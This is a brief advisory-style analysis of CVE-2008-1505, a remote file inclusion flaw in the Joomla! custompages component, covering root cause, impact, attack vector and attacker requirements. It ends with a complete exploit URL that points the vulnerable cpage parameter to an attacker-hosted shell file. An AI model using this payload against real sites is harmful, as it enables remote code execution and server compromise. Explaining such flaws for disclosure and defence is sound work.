Based on the provided content, here's an analysis of CVE-2008-1505:

**Root cause of vulnerability:**
- The Joomla! component `custompages` version 1.1 and earlier has a vulnerability due to the insecure inclusion of remote files.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The `cpage` parameter in the URL is vulnerable to RFI. This allows an attacker to include a remote file (such as a shell script) from a malicious server by injecting a URL into the `cpage` parameter.

**Impact of exploitation:**
- **Arbitrary Code Execution:** By including a malicious PHP file, an attacker could execute arbitrary code on the server. This can lead to complete compromise of the affected system, including data theft, modification, or denial of service.

**Attack vectors:**
- The vulnerability is accessible via HTTP GET requests. The attacker needs to craft a URL containing the `com_custompages` component and the vulnerable `cpage` parameter, which points to the attacker's malicious script.

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the vulnerable web server.
- The attacker needs a server where a malicious PHP file can be hosted and accessed by the vulnerable system.

**Technical Details:**
The vulnerable URL would look like this:
`http://www.target.com/index.php?option=com_custompages&cpage=http://atackweeb.cl/colocoloshell.txt?`

Here, `http://atackweeb.cl/colocoloshell.txt?` is the attacker's controlled URL, which contains the malicious PHP code to be executed.
